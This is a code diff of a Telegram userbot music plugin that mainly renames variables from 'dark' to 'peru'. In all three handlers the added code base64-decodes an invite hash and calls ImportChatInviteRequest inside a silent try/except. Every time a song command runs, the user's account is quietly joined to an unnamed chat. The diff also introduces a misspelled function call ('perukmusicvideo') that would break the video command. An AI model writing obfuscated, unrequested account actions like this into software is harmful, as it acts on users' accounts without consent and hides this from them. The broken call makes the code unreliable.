@@ -19,7 +19,7 @@ from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 from .. import CMD_HELP
 from ..utils import admin_cmd, edit_or_reply
-from . import darkmusic, darkmusicvideo
+from . import perumusic, perumusicvideo
 
 
 @borg.on(admin_cmd(pattern="song( (.*)|$)"))
@@ -38,23 +38,23 @@ async def _(event):
         return
     event = await edit_or_reply(event, "`wi8..! I am finding your song....`")
     try:
-        dark = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        dark = Get(dark)
-        await event.client(dark)
+        peru = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        peru = Get(peru)
+        await event.client(peru)
     except BaseException:
         pass
-    await darkmusic(str(query), "128k", event)
+    await perumusic(str(query), "128k", event)
     l = glob.glob("./temp/*.mp3")
     if l:
-        await event.edit("yeah..! i found something wi8..🥰")
+        await event.edit("yeah..! i found something wi8..")
     else:
         await event.edit(f"Sorry..! i can't find anything with `{query}`")
         return
-    thumbdark = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
-    if thumbdark:
-        darkthumb = thumbdark[0]
+    thumbperu = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
+    if thumbperu:
+        peruthumb = thumbperu[0]
     else:
-        darkthumb = None
+        peruthumb = None
     loa = l[0]
     await borg.send_file(
         event.chat_id,
@@ -62,7 +62,7 @@ async def _(event):
         force_document=False,
         allow_cache=False,
         caption=query,
-        thumb=darkthumb,
+        thumb=peruthumb,
         supports_streaming=True,
         reply_to=reply_to_id,
     )
@@ -88,23 +88,23 @@ async def _(event):
         return
     event = await edit_or_reply(event, "`wi8..! I am finding your song....`")
     try:
-        dark = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        dark = Get(dark)
-        await event.client(dark)
+        peru = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        peru = Get(peru)
+        await event.client(peru)
     except BaseException:
         pass
-    await darkmusic(str(query), "320k", event)
+    await perumusic(str(query), "320k", event)
     l = glob.glob("./temp/*.mp3")
     if l:
         await event.edit("yeah..! i found something wi8..🥰")
     else:
         await event.edit(f"Sorry..! i can't find anything with `{query}`")
         return
-    thumbdark = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
-    if thumbdark:
-        darkthumb = thumbcat[0]
+    thumbperu = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
+    if thumbperu:
+        peruthumb = thumbperu[0]
     else:
-        darkthumb = None
+        peruthumb = None
     loa = l[0]
     await borg.send_file(
         event.chat_id,
@@ -112,7 +112,7 @@ async def _(event):
         force_document=False,
         allow_cache=False,
         caption=query,
-        thumb=darkthumb,
+        thumb=peruthumb,
         supports_streaming=True,
         reply_to=reply_to_id,
     )
@@ -137,29 +137,29 @@ async def _(event):
         event = await edit_or_reply(event, "What I am Supposed to find")
         return
     event = await edit_or_reply(event, "wi8..! I am finding your videosong....")
-    await darkmusicvideo(query, event)
+    await perukmusicvideo(query, event)
     try:
-        dark = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        dark = Get(dark)
-        await event.client(dark)
+        peru = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        peru = Get(peru)
+        await event.client(peru)
     except BaseException:
         pass
     l = glob.glob(("./temp/*.mp4"))
     if l:
-        await event.edit("yeah..! i found something wi8..🥰")
+        await event.edit("yeah..! i found something wi8..")
     else:
         await event.edit(f"Sorry..! i can't find anything with `{query}`")
         return
-    thumbdark = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
-    if thumbdark:
-        darkthumb = thumbdark[0]
+    thumbperu = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
+    if thumbperu:
+        peruthumb = thumbperu[0]
     else:
-        darkthumb = None
+        peruthumb = None
     loa = l[0]
     await borg.send_file(
         event.chat_id,
         loa,
-        thumb=darkthumb,
+        thumb=peruthumb,
         caption=query,
         supports_streaming=True,
         reply_to=reply_to_id,
